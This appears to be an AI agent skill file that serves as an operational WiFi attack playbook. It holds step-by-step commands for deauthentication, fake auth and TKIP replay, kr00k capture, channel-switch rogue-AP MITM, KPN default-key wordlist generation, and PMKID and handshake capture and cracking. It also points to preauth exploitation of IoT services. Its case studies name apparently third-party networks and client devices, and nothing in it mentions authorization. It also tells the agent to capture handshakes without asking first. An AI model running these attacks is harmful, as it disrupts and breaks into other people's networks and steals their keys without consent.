---
name: wireless-security-testing
description: Complete wireless security — reconnaissance, attack surface analysis, protocol vulnerability research (TKIP, kr00k, CSA MC-MITM, WPA3, KPN key derivation), handshake/PMKID capture, multi-rig coordination, and embedded device service exploitation. Consolidates: wireless-security-research, wifi-recon-and-attack, csa-multi-channel-mitm.
---

## Trigger conditions

Load this skill when the user:
- Asks to scan for, enumerate, or survey wireless networks
- Wants to capture WPA handshakes or PMKIDs
- Asks about WiFi attack vectors (TKIP, WPS, fragattack, KRACK, Dragonblood, etc.)
- Wants a target prioritization or attack surface analysis
- Mentions airodump-ng, hcxdumptool, wash, reaver, bully, tkiptun-ng, or similar tools
- References the custom Nethunter/S10+/Gemster Kernel environment

---

## CRITICAL: Consultation gate

The user wants autonomous initiative but requires a checkpoint before active attacks.
**Before launching any attack** (deauth, WPS PIN brute, Pixie Dust, fake auth, ARP
injection, tkiptun-ng replay, chopchop, beacon spoofing, evil twin, etc.),
pause and ask: "Shall I proceed?" or equivalent.

Passive reconnaissance (scanning, beacon capture, handshake/PMKID collection) does
NOT require this gate — go ahead without asking. The line is: if it transmits frames
that could trigger IDS, disrupt clients, or lock out WPS, consult first.

---

## Environment constraints (Nethunter / S10+ / Gemster Kernel)

- **ext2 (AWUS036NH)** and **ext3 (AWUS051NH)** are the external USB adapters for
  monitor mode and attacks. These were renamed from wlan2/wlan3 to prevent Android
  daemons (wificond, netd, wpa_supplicant, NetworkManager) from detecting and
  interfering with them.
- **wlan0 and wlan1 are INTERNAL DEVICE RADIOS** — NEVER touch, configure, bring down,
  or change them. The user connects via SSH through these. Touching them kills your
  own connection.
- **No GPU / OpenCL** — hashcat will fail with "No devices found/left."
  Do not attempt GPU cracking on this device. Capture hashes here; crack elsewhere
  (user has an NVIDIA RTX Pro 2000 Blackwell laptop for that).
- **aarch64 / ARM** — CPU cracking (aircrack-ng) works but is slow. Only use for
  quick checks against small wordlists.
- **Host OS**: Android LineageOS with Kali Nethunter chroot.

### Channel stability: the ext* naming trick

Android's network management stack (wificond, netd, wpa_supplicant, NetworkManager)
pattern-matches interface names containing "wlan" and tries to manage them — even
with `svc wifi disable` and airplane mode. This causes channel-hopping interference
when daemons periodically wake up and yank monitor interfaces to other channels.

**Fix**: rename external adapters to avoid the "wlan" prefix:

```bash
ip link set wlan2 name ext2
ip link set wlan3 name ext3
```

The daemons ignore interfaces without "wlan"/"wifi" in their name. This is more
reliable than `svc wifi disable` + airplane mode alone. After renaming, re-apply
monitor mode:

```bash
ip link set ext2 down; iw dev ext2 set type monitor; ip link set ext2 up
ip link set ext3 down; iw dev ext3 set type monitor; ip link set ext3 up
```

---

## Tool sequencing rules

Do NOT run multiple tools on the same monitor interface simultaneously.
Examples of bad combinations:
- airodump-ng + wash on wlan2 → channel contention, both miss data
- hcxdumptool + airodump-ng on wlan2 → same problem

Run scans sequentially. Use `airodump-ng` with `-w` (CSV output) for the
primary survey, then parse/analyze, then run follow-up tools one at a time.

---

## WPS: Largely dead

WPS 2.0 APs rate-limit after **1 attempt** with lengthy lockout periods
(often 60+ seconds). WPS 1 APs are extremely rare. Pixie Dust and PIN brute
force are not worth attempting on modern hardware.

If wash reports WPS "UNLOCKED," verify with reaver before committing —
modern routers (ASUS BT8, etc.) often report false positives. If reaver
shows "Detected AP rate limiting," abort — the vector is closed.

## WiFi 7 / WPA3 MLO false positives

WiFi 7 APs with MLO (Multi-Link Operation) are frequently misidentified by
wireless tools. Known phantom readings include:
- **\"WPA3/WPA2 mixed mode\"** — the AP is actually WPA3-only (required for WiFi 7 MLO)
- **\"OPEN network\"** — some tools misparse the MLO beacon structure
- **WPS state false positives** — wash may report \"UNLOCKED\" on an AP that has WPS disabled

The ASUS ZenWiFi BT8 is a known offender. When you see a -30 dBm signal with
WPA3 mixed-mode and WPS unlocked on ch13 from a WiFi 7 router right next to
the scanning device, treat all tool-reported WPS/auth data as suspect. Verify
by actually attempting association or checking the router's admin panel.

## Active low-traffic WPA2 targets (fragattack / KRACK candidates)

When you find a WPA2 CCMP AP with strong signal and encrypted data frames
but few visible clients, it's a prime candidate for protocol-level probing:

| Signal | What it means |
|--------|---------------|
| Beacons only | Dead AP — no clients, no router, no traffic |
| Beacons + encrypted data (1-5/min) | Sleepy client sending keepalives — traffic EXISTS |
| Beacons + data + visible stations | Active network — best case |

Even 2 encrypted frames per minute at -18 dBm is enough to work with.
Such targets are ideal for:
- **Deauth + handshake capture** — force the sleepy client to re-handshake
- **FragAttack probing** — test the AP's fragment/aggregation handling
- **KRACK retransmission tests** — capture and analyze 4-way handshakes

The EPCOT network (B4:FB:E4:47:98:BF, ch1, -18 dBm, WPA2 CCMP) at the
survey site exemplifies this class: 41 data frames in 30s survey but no
stations visible in real-time display — proves client(s) exist but are
idle. See `references/tkip-analysis.md` for the EPCOT case study.

### PMF (802.11w) verification

Before wasting deauth attempts, check whether the AP uses Protected Management
Frames. PMF makes unencrypted deauth frames useless — both AP and client ignore
them. Verify with tshark:

```bash
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8 and wlan.sa == <BSSID>" \
  -V | grep -i "Management Frame Protection"
```

Look for:
- `Management Frame Protection Required: Not required` → deauths MAY work
- `Management Frame Protection Capable: Not capable` → deauths MAY work
- `Management Frame Protection Required: Required` → deauths WILL NOT work
- `Management Frame Protection Capable: Capable` → mixed, try anyway

Even with PMF off, some IoT devices ignore deauth floods — they reconnect on
their own schedule. See the broadcast deauth fallback below.

### Deauth strategy for stubborn IoT clients

When targeted deauth (-c <client_mac>) gets ACKs but no reconnection handshake:

1. **Try broadcast deauth** — hits all clients simultaneously:
   ```bash
   aireplay-ng -0 5 -a <BSSID> wlan2
   ```

2. **Longer dwell** — sleepy IoT devices may take 10-15 minutes to re-handshake.
   Set up a 15-minute airodump capture on the target channel and walk away.

3. **Multiple client targeting** — if data frames reveal multiple source MACs
   (even if airodump doesn't list them as stations), cycle through them all.

4. **Check for MAC randomization** — modern devices rotate MACs. The client
   you deauthed may reconnect with a different MAC, so your targeted airodump
   filter misses the new handshake.

3 partial EAPOL frames (M1/M3 only) after 2000+ deauth ACKs means the client
is trying but not completing the handshake within the capture window. Extend
the dwell time rather than increasing deauth volume.

---

## WPA1 / TKIP detection

Not all tools correctly identify TKIP support. airodump-ng may show
"WPA2 CCMP PSK" even when TKIP is advertised. To definitively check:

**Method A — Beacon deep-decode (single target):**
1. Capture beacons: `tcpdump -i wlan2 -c 20 -w beacons.pcap 'wlan[0] == 0x80 and ether host <BSSID>'`
2. Decode with tshark: look for **WPA Information Element** (tag 221, OUI 00:50:f2 Microsoft, type 1)
3. If present, check Multicast Cipher Suite and Unicast Cipher Suite List for TKIP (type 2)
4. Pure WPA1 (no RSN IE at all) is the ideal TKIP target — group traffic is always TKIP

**Method B — Broad TKIP sweep with tshark (all APs at once):**
```bash
# Capture beacons across all channels
tshark -i wlan2 -f "type mgt subtype beacon" -w beacons.pcap -c 200

# Filter for TKIP group cipher in RSN IE (type 2)
tshark -r beacons.pcap -Y "wlan.rsn.gcs.type == 2" -T fields -e wlan.sa -e wlan.ssid | sort -u

# Also check WPA1 IEs: decode the full beacon for both RSN + WPA IEs
tshark -r beacons.pcap -V | grep -A10 "WPA Information Element\|RSN Information"
```
Key indicators in the decode:
- `Group Cipher Suite: 00:0f:ac TKIP` in RSN IE
- `Multicast Cipher Suite: 00:50:f2 TKIP` in WPA IE
- `Unicast Cipher Suite List ... TKIP` — means clients CAN negotiate TKIP

**Method C — Verify against airodump CSV:**
Parse the CSV for TKIP in the cipher column, but note this may miss some APs:
```bash
grep -i "tkip" /tmp/survey-01.csv
```

A WPA1-only AP with TKIP group cipher and 0 clients is the classic tkiptun-ng
challenge: no clients = no encrypted data packets to replay.

## Remote rig access (dish antenna)

A secondary machine is available for directional scanning:

```
sshpass -p '<password>' ssh hermes@192.168.50.136
```

- Vye mini, Kali i686, Alfa AWUS036NH (Ralink RT2870/RT3070) on wlan0
- 25dBi dish antenna — narrow beam, high gain, different network view
- Monitor mode pre-configured on wlan0, Tx-Power 33 dBm
- Use `sudo` for aircrack-ng tools (passwordless sudo configured)
- The directional antenna means you only see networks in one direction — complement the S10+ omnidirectional view
- **Split-rig deauth/capture**: use the dish rig to deauth while the S10+ captures data on the same channel. Avoids the self-flooding problem where deauth frames saturate your own capture. Both rigs must be on the same channel and able to hear the target.
- **Deauth flooding pitfall**: 400+ deauth frames in a 60-second window will saturate the channel. Your capture ends up 98% deauth frames and you miss the post-disassociation data you're trying to catch. Use 1-2 surgical deauths, or the split-rig pattern above.

## Multi-Rig Coordination

When both S10+ and Vye are available:
- **S10+ captures, Vye deauths** (or vice versa) — avoids deauth flood drowning the capture
- Both rigs must see the target (Vye's dish is directional — verify visibility first)
- Use sshpass for automated remote commands: `sshpass -p '<pass>' ssh hermes@192.168.50.136 'sudo <cmd>'`
- **Split-rig deauth/capture**: use the dish rig to deauth while the S10+ captures data on the same channel. Avoids the self-flooding problem where deauth frames saturate your own capture. Both rigs must be on the same channel and able to hear the target.

## Fracture / FragAttack Tools (WPA2 protocol probing)

Located at `/sdcard/tools/fracture/` and `/root/fracture/` (venv: `frac`). Test WPA2 implementations for fragment/aggregation vulnerabilities (FragAttacks, CVE-2020-24586/24587/24588).

### Common bug: MAC addresses in IP target lists
Many attack tools collect `network.clients` which contains **MAC addresses**, not IPs. When these are passed to `IP(src=client_mac)` in scapy, the `inet_aton()` call crashes with:
```
OSError: illegal IP address string passed to inet_aton
socket.gaierror: [Errno -2] Name or service not known
```
**Fix pattern:** Filter client entries before using as IPs:
```python
for client in network.clients:
    parts = client.split('.')
    if len(parts) == 4 and all(p.isdigit() for p in parts):
        targets.append(client)  # valid IP
    # else: skip MAC address
```
This was patched in fracture's `paths.py` line 331. Same pattern applies to any tool mixing client lists with IP operations.

## CSA (Channel Switch Announcement) Dual-Interface Attack

CSA beacons (802.11h tag 37) trick clients into following the AP to a different channel.

### Proven dual-interface formula
Interface A (real channel): continuous CSA injection via scapy (20/sec). Interface B (rogue channel): airbase-ng rogue AP spoofing target BSSID.

```
Interface A (real channel, ch1):
  python3 scripts/csa_inject_continuous.py ext2    # 20 CSAs/sec, scapy

Interface B (rogue channel, ch6):
  airbase-ng -e <ESSID> -a <BSSID> -c 6 ext3
```

**Real-world result (EPCOT):** IoT client `5C:2F:AF:06:BE:14` followed CSA beacons from ch1 to ch6, connected to airbase-ng rogue AP. 2200+ beacons exchanged, client probed and sent encrypted data frames. ~7,800 CSA beacons before client switched. Blocked only by missing WPA password for full 4-way handshake.

**CSA injector script:** `scripts/csa_inject_continuous.py` — ready-to-run continuous CSA beacon injector. Emits 20/sec. Usage: `python3 csa_inject_continuous.py <interface> [bssid] [ssid] [real_ch] [rogue_ch]`.

**Why single-interface CSA fails:** Can't inject CSA on real channel AND host rogue AP simultaneously. Beacon timestamp drift causes rejection. Incomplete IE cloning makes beacons not match real AP profile.

**mc-mitm tool:** Mathy Vanhoef's Multi-Channel MITM at `/sdcard/tools/mc-mitm/`. Requires TWO interfaces. Supports `--continuous-csa` flag. Pitfall: `libwifi` submodule often empty — run `git submodule update --init --recursive`. If broken, fall back to airbase-ng + scapy CSA combo.

## Embedded Device Network Service Exploitation

Post-recon exploitation of embedded network services (HTTP, TLS, mDNS, UPnP) running on WiFi-connected IoT devices. When nmap reveals embedded stacks (Mongoose, GoAhead, lighttpd, etc.), pivot from wireless attacks to service-level exploitation.

### Mongoose CVEs (CVE-2026-5244/5245/5246)
Three preauth vulnerabilities in Mongoose v7.0–v7.20 by evilsocket (April 2026). Single-file C library on hundreds of millions of IoT devices.

- **CVE-2026-5245 (mDNS stack overflow):** 282-byte stack buffer overflow via single UDP packet to 224.0.0.251:5353. Preauth RCE on MIPS/ARM with executable stack.
- **CVE-2026-5244 (TLS heap overflow):** 528-byte heap buffer overflow via oversized RSA client cert during TLS handshake. Preauth, before any HTTP request.
- **CVE-2026-5246 (mTLS bypass):** P-384 ECDSA CA signature verification returns success without checking. Trivial — just use P-384 CA server.

Target mapping: ZTE-Home gateways (port 9080 Mongoose httpd), LG webOS TVs (port 3000/3001). See `references/mongoose-vulnerabilities.md` for full target mapping, recon methodology, and exploitation paths.

## TKIP attack workflow (fake auth + replay)

When a TKIP-enabled AP has 0 clients, the critical first step is to force
a relationship that might generate traffic:

### Step 1: Fake auth + association
```bash
iw dev wlan2 set channel <ch>
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> wlan2
```
If you get "Association successful :-) (AID: 1)" — you are the sole client.
This is a good sign but does NOT guarantee traffic exists.

### Step 2: Sniff for data frames
```bash
tcpdump -i wlan2 -w traffic.pcap -c 200 "ether host <BSSID>"
tcpdump -r traffic.pcap | grep -v "Beacon\|Probe Response"
```
If only beacons and probe responses — dead AP, no upstream traffic.

### Step 3: ARP replay attempt
```bash
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> wlan2
```
If you see "got 0 ARP requests" after 1000+ packets — move on.

### Step 4: tkiptun-ng (if replayable data exists)
```bash
tkiptun-ng -a <BSSID> -e <ESSID> -h <YOUR_MAC> wlan2
```

### Common dead end

Fake auth may succeed but yield no encrypted data frames. Without at least
one valid encrypted packet, tkiptun-ng has nothing to replay and chopchop
has nothing to chop. Even forcing re-authentication (deauth + re-auth) may
not trigger a 4-way handshake if the AP caches sessions. The signal to
abandon: 0 data frames across 30+ seconds of monitoring after successful
association. See `references/tkip-analysis.md` for the RedWine case study
where this exact pattern played out.

### Step 5: Michael MIC validation (when data frames exist)

If you captured encrypted data frames, validate they are TKIP before committing
to a full replay attack:

```bash
tkiptun-ng -a <BSSID> -h <YOUR_MAC> -r captured_data.pcap wlan2
```

A "Michael Test: Successful" output confirms the frames use TKIP encryption
and the Michael MIC integrity check passes. This means tkiptun-ng CAN work
with these frames -- the challenge is finding a replayable one.

### Step 6: The ARP dead-end

Even with validated TKIP frames and successful association, tkiptun-ng
needs a replayable packet -- typically an ARP request. In modern networks:

- IoT devices use mDNS/SSDP, not ARP, for discovery
- ARP caches are stable for hours on low-churn home networks
- DHCP leases are 24h -- ARP only during renewal at T1=12h
- No real client = no ARP source = no replay candidate

If `aireplay-ng -3` shows "got 0 ARP requests" after 1000+ packets, abort.
This is the fundamental chicken-and-egg: you need traffic to break TKIP,
but you need the TKIP key to generate traffic as a legitimate client.

See `references/tkip-analysis.md` for the BWA-0A6C60 case study where
Michael validation succeeded but ARP was absent.

---

## kr00k attack (CVE-2019-15126) — Broadcom zeroed-TK data leak

kr00k causes Broadcom/Cypress WiFi chips to transmit buffered data with an
all-zero temporal key (TK) after a client disassociates. The AP leaks whatever
was in its TX buffer, encrypted with a known key.

### Encryption compatibility

- **WPA2-only**: kr00k exploits a WPA2-specific firmware path. The all-zero key
  bug does NOT exist in WPA3-SAE's Dragonfly handshake code path.
- **WPA3-only APs are NOT viable targets** — even with confirmed Broadcom chipsets.
- **WPA2/3 mixed-mode APs are the BEST targets** — clients can fall back to WPA2,
  meaning the vulnerable code path is still active on the AP.
- Pure `WPA3 CCMP SAE` in airodump = dead end. `WPA3 WPA2 CCMP SAE PSK` = viable.

### Chipset identification

**OUI matching is unreliable** because many modern APs use randomized MACs
(locally-administered bit set in the first octet: 2, 6, A, E). These won't
match any manufacturer database. The real kr00k test is **active**:
deauth a client, capture subsequent data frames, and check if any decrypt with
an all-zero TK. No OUI guessing needed — the bug either manifests or it doesn't.

Known Broadcom OUI prefixes (partial list from kr00k_scanner.py):
`F8:0D:A9` (Odido routers), plus ~150 others in `/root/kr00k_scanner.py`.

### Prerequisites
- Broadcom or Cypress-based AP (confirmed by OUI or active test)
- WPA2 encryption (pure or mixed mode) — NOT WPA3-only
- **Active client sessions with data flowing through the TX buffer** — without
  live traffic, there is nothing to leak
- The AP must be handling data frames; beacons and probe responses
  are management frames and never use the TK

### Attack workflow

1. **Verify the AP has active data traffic** — passive capture first:
   ```bash
   iw dev wlan2 set channel <ch>
   tcpdump -i wlan2 -w check.pcap -c 200 'ether host <BSSID> and (wlan[0] & 0x0c) = 0x08'
   ```
   If 0 data frames from the AP in passive capture, abort — no TX buffer to leak.

2. **Surgical deauth** (NOT a flood):
   ```bash
   aireplay-ng -0 2 -a <BSSID> wlan2
   ```
   Flooding with 400+ deauth frames saturates the channel and drowns out the
   very data frames you're trying to capture. Use 1-2 shots.

3. **Capture post-disassociation data frames** from the AP:
   ```bash
   tcpdump -i wlan2 -w kr00k_capture.pcap -c 300 'ether host <BSSID> and (wlan[0] & 0x0c) = 0x08'
   ```

4. **Check for zero-key decryption** — frames captured after the deauth should
   be decryptable with an all-zero TK. Use a Wireshark/TShark decryption key
   of `00000000000000000000000000000000` for the TKIP temporal key.

### Split-rig approach

To avoid deauth floods drowning your own capture, use two interfaces:
- **Rig A**: deauths the target
- **Rig B**: captures data frames on the same channel
Both must be on the same channel and able to hear the target AP.

### Common failure mode

All Broadcom APs in a residential area may be idle — powered on but with no
active client sessions. Even with successful deauth, 0 data frames appear in
the post-deauth capture because there was nothing in the TX buffer to begin
with. This is the dominant pattern: beacons and probe responses only, zero
data traffic. Abort if passive capture shows 0 data from the target AP.

## Michael MIC validation for TKIP

When encrypted data frames exist on a TKIP AP but ARP replay fails, validate
that the frames are actually TKIP before abandoning:

```bash
tkiptun-ng -a <BSSID> -h <YOUR_MAC> -r captured_data.pcap wlan2
```

Output `"Michael Test: Successful"` confirms the frames use valid TKIP
encryption — tkiptun-ng CAN work with them. The problem is finding a
replayable ARP candidate, not a protocol incompatibility.

See `references/target-catalog.md` for the BWA-0A6C60 case study where
Michael validation passed but no ARP candidate existed.

---

## Target prioritization factors

When ranking targets from a survey, weight by:
1. **Signal strength** (stronger = more reliable attacks)
2. **Encryption type** — WPA1 > WPA2-TKIP > WPA2 > WPA3
3. **WPS state** (UNLOCKED, though likely rate-limited)
4. **Client activity** (more data frames = more replay opportunities)
5. **Hardware/ISP** — known-default-password ISPs (KPN Arcadyan, Ziggo) have
   predictable key derivation; TP-Link, AVM FRITZ!Box have CVE history
6. **Interesting attack surface** — TKIP, WPA3 mixed-mode, mesh backhaul SSIDs

---

## KPN / Arcadyan Default Key Derivation

KPN ISP routers (Arcadyan SuperWiFi2.0, H220N) often use predictable default WPA keys derived from the router's serial number.

**Algorithm:** `WPA key = SHA1(serial_number)[:20].upper()` — 20 uppercase hex chars.

**Serial formats:**
- **KPN Experia Box (SuperWiFi2.0):** `CP` + 10 hex chars. SSID = `KPN` + last 6 hex. For `KPN7124A6`, serial = `CP????7124A6` → 65,536 unknown combos.
- **H220N:** Serial = SSID itself (e.g., `H220N123355`).
- **Other variants:** `KPNE` + 6 digits.

**Cracking workflow:**
1. Generate candidate wordlist: `python3 scripts/kpn_keygen.py 7124A6 -o wordlist.txt` (65,536 candidates)
2. Feed to hashcat on GPU machine: `hashcat -a 0 -m 22000 pmkiddies.22000 kpn_wordlist.txt -d 1 -w 3`
3. Run against captured PMKIDs first (faster), then handshakes

**Pitfalls:**
- Many KPN routers reconfigured with custom passwords — default algorithm won't work
- SSID suffix only gives 6 of ~12 serial chars
- Mesh networks may mix hardware (Sagemcom, AzureWave with Arcadyan)
- Check MAC_AP OUI via `hcxhashtool -i hashes.22000 --info=stdout` — if not Arcadyan, algorithm is wrong

## Roaming ping-pong handshake capture

When a target ESSID has **multiple APs** (same SSID, different BSSIDs) and a client that roams between them, you can use deauth ping-pong to force repeated handshakes until a clean full 4-way is captured:

1. Interface A monitors AP1, Interface B monitors AP2 (both same channel or adjacent)
2. Deauth the client on AP1 → client drops off, roams to AP2
3. Interface B captures the reassociation + handshake on AP2
4. Deauth the client on AP2 → client roams back to AP1
5. Interface A captures the handshake on AP1
6. Repeat until a clean full 4-way (M1→M2→M3→M4) is captured

**Why this works:** The client doesn't "disappear" after deauth — it roams to the other AP. Instead of fighting this, use it as a tennis match. Each bounce is another handshake opportunity. Eventually the timing lines up for a complete capture.

**Prerequisites:**
- Multiple APs broadcasting the same ESSID within range
- A roaming client that actively switches between them
- Two monitor interfaces (or two rigs like S10+ + Vye)

**Real-world example (RedWine):** Printer client SeikoEpson_68:0b:41 bouncing between two RedWine APs. ext2 on AP1, ext3 on AP2. Deauth ext2 → printer to AP2 → ext3 grabs partial. Deauth ext3 → printer to AP1 → ext2 grabs partial. After several rounds, captured clean full 4-way on one side.

## airodump-ng radiotap pitfall (Ralink/Mediatek chipsets)

`airodump-ng` captures bare 802.11 frames (DLT_IEEE802_11, DLT 20) on Ralink/Mediatek
chipsets (AWUS036NH, AWUS051NH, RT2870/RT3070 and related). **All radiotap headers are
stripped** — no signal strength (dBm), noise floor, data rate, channel metadata, or
antenna info. This is a known multi-year issue with no fix upstream.

**Verification:**
```bash
tcpdump -i ext2 --list-data-link-types   # shows IEEE802_11_RADIO available
capinfos capture.cap | grep encapsul     # shows DLT_IEEE802_11 (20), NOT radiotap
tshark -r capture.cap -T fields -e radiotap.dbm_antsignal | head -3  # empty
```

**The driver supports radiotap** (confirmed via `tcpdump --list-data-link-types`) but
airodump-ng opens the pcap socket with the default DLT, which is bare 802.11 on these
chipsets. `hcxdumptool` explicitly requests `IEEE802_11_RADIO` and produces captures
with full per-packet RF metadata.

**Impact:** Bare 802.11 caps are still crackable (ANonce/SNonce/MIC are intact) but
lose all signal analysis capability. For hashcat, it makes zero difference. For RF
analysis, triangulation, or proximity verification, the data is gone.

**Recommendation:** Use `hcxdumptool` for captures that need RF metadata. Use
`airodump-ng` for live AP table visualization only (its real-time display is still
best in class), not for capture output.

## Handshake / PMKID capture

For broad passive collection:
```
hcxdumptool -i wlan2 -w capture.pcapng -F --tot=2 --rds=3
```
- `-F`: all frequencies
- `--tot=N`: total minutes to run
- `--rds=3`: show all APs and clients in real-time display

Convert to hashcat format:
```
hcxpcapngtool -o hashes.hc22000 -E essidlist.txt capture.pcapng
```

Decode captured hashes to human-readable names using the bundled script:
```
python3 scripts/decode_hashes.py /tmp/handshakes.hc22000
python3 scripts/decode_hashes.py /tmp/handshakes.hc22000 --brief
```

For targeted PMKID on a specific AP:
```
hcxdumptool -i wlan2 -c <channel>a -t 15 --exitoneapol=1 -w pmkid.pcapng
```
- `--exitoneapol=1`: exit on first PMKID (bitmask: 1=PMKID)

Decode hc22000 format: `WPA*02*MIC*MAC_AP*MAC_STA*ESSID_HEX*ANONCE*EAPOL*NC`

See `references/tkip-analysis.md` for detailed case studies (RedWine WPA1, Ziggo8528082 dual-stack) and the full TKIP hunting methodology with tshark.
See `references/bwa-tkip-case-study.md` for the BWA-0A6C60 case study (Michael validation succeeded, ARP dead-end).
See `references/target-catalog.md` for the full target inventory from May 2026 (TKIP networks, kr00k candidates, signal strengths, attack results per target). (RedWine WPA1, Ziggo8528082 dual-stack) and the full TKIP hunting methodology with tshark.

See `scripts/decode_hashes.py` for decoding hc22000 hash files to human-readable format.

## wpa-sec submission (two-step session flow)

The `wlancap2wpasec` tool from hcxtools is **broken** as of 2026. It sends the wpa-sec key as a `Cookie: key=...` header in a single multipart POST to `/`, using field name `file`. The wpa-sec site now uses a **two-step session-based flow** that requires:

### Step 1: Establish key session
```bash
curl -s -c /tmp/wpasec.cookies -b /tmp/wpasec.cookies \
  "https://wpa-sec.stanev.org/?submit" \
  -d "key=YOUR_32_CHAR_HEX_KEY"
```
Expected: HTTP 200 (valid key sets session cookie), HTTP 302 (invalid key).

### Step 2: Upload capture with session cookie
```bash
curl -s -b /tmp/wpasec.cookies \
  "https://wpa-sec.stanev.org/?submit" \
  -F "webfile=@capture.pcapng"
```
Note: the field name is `webfile` (not `file` as the old tool used).

### Why the old tool fails
- Sends key as cookie header instead of establishing a session via form-urlencoded POST
- Uses field name `file` instead of `webfile`  
- No session cookie = upload processed anonymously, never linked to user's "My Nets"
- Server response is `text/html` so the tool dumps raw HTML to stdout — confusing but not the root cause

### Verification
After uploading, check https://wpa-sec.stanev.org/?nets with your key in the Key textbox to confirm the capture appears under "My Nets."

### Pitfall
The site is behind Cloudflare. Direct curl works from this environment but some networks/proxies may trigger bot challenges. If you get HTML challenge pages instead of the expected response, use the browser-based upload at `/?submit` as fallback.

### Python urllib HTTPRedirectHandler pitfall
When using Python's stdlib `urllib.request` with a custom `HTTPRedirectHandler` that stops redirects, you MUST override **both** `redirect_request()` (return `None`) **and** `http_error_302()` (return the response object `fp`). If you only override `redirect_request()`, the default error handler raises `HTTPError: HTTP Error 302: Found` because it sees the 302 as unhandled. This is non-obvious — returning `None` from `redirect_request()` does NOT prevent the error from propagating up the handler chain.

```python
class StopRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None                      # don't follow
    def http_error_302(self, req, fp, code, msg, headers):
        return fp                        # treat 302 as valid response
```

### Python uploader script
A drop-in replacement for `wlancap2wpasec` is available at `scripts/wpasec_upload.py`. Usage:
```bash
python3 scripts/wpasec_upload.py -k <32-char-hex-key> capture.pcapng
python3 scripts/wpasec_upload.py -k <key> -R *.pcapng  # remove after success
```

See `references/wpa-watchdog.md` for the auto-upload folder monitor (cron/daemon mode).

See `scripts/csa_inject_continuous.py` for the ready-to-run continuous CSA beacon injector (scapy, 20/sec).

See `scripts/kpn_keygen.py` for KPN Arcadyan default WPA key wordlist generator.

See `references/mongoose-vulnerabilities.md` for full Mongoose CVE target mapping, recon methodology, and exploitation paths.

See `references/kr00k-field-results-2026-05.md` for May 2026 kr00k field test results across 9 APs.

See `references/target-inventory.md` for comprehensive target inventory from WiFi surveys.
